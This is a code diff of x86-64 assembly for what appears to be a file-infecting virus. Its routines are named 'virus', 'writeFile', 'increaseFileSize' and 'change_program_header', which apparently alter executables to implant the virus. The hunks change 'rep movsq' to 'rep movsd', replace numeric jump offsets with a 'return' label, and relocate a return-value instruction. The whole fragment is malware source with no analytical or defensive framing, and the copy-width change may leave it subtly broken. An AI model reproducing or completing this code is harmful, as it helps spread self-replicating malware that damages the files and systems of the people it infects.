@@ -48,7 +48,7 @@ virus:
 	mov    ecx,0x10
 	mov    rsi,rbx
 	mov    rdi,rsp
-	rep    movsq
+	rep    movsd
 	call   check_file
 	mov    rsp,rbx
 	test   eax,eax
@@ -57,7 +57,7 @@ virus:
 	mov    ecx,0x10
 	mov    rsi,rbx
 	mov    rdi,rsp
-	rep    movsq
+	rep    movsd
 	mov    edi,r12d
 	call   writeFile
 	mov    rsp,rbx
@@ -252,7 +252,7 @@ increaseFileSize:
 	sub    rsp,0xe0
 	mov    rdi,rsp
 	lea    rsi,[rsp+0x100]
-	rep movsq
+	rep    movsd
 	mov    esi,0x8
 	mov    edi,0x3
 	call   get_section_index
@@ -710,7 +710,7 @@ writeFile:
 	mov    edx,eax
 	mov    eax,0x1
 	dec    edx
-	je     writeFile+414
+	je     return
 	movsxd r13,r12d
 	mov    rsi,QWORD [rbp+0x38]
 	xor    ecx,ecx
@@ -745,7 +745,7 @@ writeFile:
 	lea    rsi,[rbp+0x10]
 	mov    rcx,rbx
 	mov    rdi,rsp
-	rep    movsq
+	rep    movsd
 	mov    rdi,QWORD [rbp-0x78]
 	call   get_last_load_segment
 	mov    rdi,rsp
@@ -756,7 +756,7 @@ writeFile:
 	mov    r13,rsi
 	imul   rsi,rsi,0x38
 	add    rsi,rax
-	rep    movsq
+	rep    movsd
 	mov    rdi,rsp
 	lea    rsi,[rbp+0x10]
 	mov    rcx,rbx
@@ -768,13 +768,13 @@ writeFile:
 	mov    rcx,rbx
 	mov    rdi,rsp
 	mov    r14d,eax
-	rep    movsq
+	rep    movsd
 	mov    edi,r12d
 	mov    rsi,QWORD [rbp-0x80]
 	call   increaseFileSize
 	add    rsp,0x40
 	dec    al
-	je     writeFile+412
+	je     return
 	mov    rsi,QWORD [rbp-0x78]
 	mov    ecx,r13d
 	lea    rdx,[rbp+0x10]
@@ -790,14 +790,14 @@ writeFile:
 	lea    rsi,[rbp+0x10]
 	mov    rcx,rbx
 	mov    rdi,rsp
-	rep    movsq
+	rep    movsd
 	mov    edi,r12d
 	mov    rdx,QWORD [rbp-0x78]
 	mov    rsi,QWORD [rbp-0x80]
 	call   change_program_header
 	add    rsp,0x40
-	xor    eax,eax
 return:
+	xor    eax,eax
 	lea    rsp,[rbp-0x28]
 	pop    rbx
 	pop    r12
